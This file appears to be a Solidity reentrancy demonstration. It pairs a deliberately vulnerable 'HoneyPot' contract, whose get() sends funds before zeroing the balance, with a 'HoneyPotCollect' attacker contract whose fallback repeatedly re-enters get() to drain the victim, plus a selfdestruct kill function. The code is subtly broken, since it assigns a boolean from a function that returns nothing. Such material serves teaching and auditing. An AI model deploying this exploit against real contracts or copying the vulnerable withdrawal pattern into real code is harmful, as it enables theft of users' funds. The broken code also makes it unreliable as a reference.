

contract HoneyPotCollect {

  HoneyPot public honeypot;
  event logString(string);
  event logfallback(uint, uint);
  address honeypot_addr;
  constructor (address _honeypot) public {
    honeypot = HoneyPot(_honeypot);
    honeypot_addr = _honeypot; 
  }
  function kill () public{
    selfdestruct(msg.sender);
  }
  function collect() public payable {
    honeypot.put.value(msg.value)();
    bool res = honeypot.get();
  }
  function () external payable {
     uint balance = honeypot.balances(msg.sender);

     emit logfallback(honeypot_addr.balance, msg.value);
    if (honeypot_addr.balance > msg.value) {
        emit logString("callback");
        bool res = honeypot.get();
    }
  }
}



contract HoneyPot {
  mapping (address => uint) public balances;
  constructor() public payable {
    put();
  }
  function put() public payable {
    balances[msg.sender] = msg.value;
  }
  function get() public payable {
      (bool succ, ) = msg.sender.call.value(balances[msg.sender])("");
      require(succ);
      balances[msg.sender] = 0;
  }

}
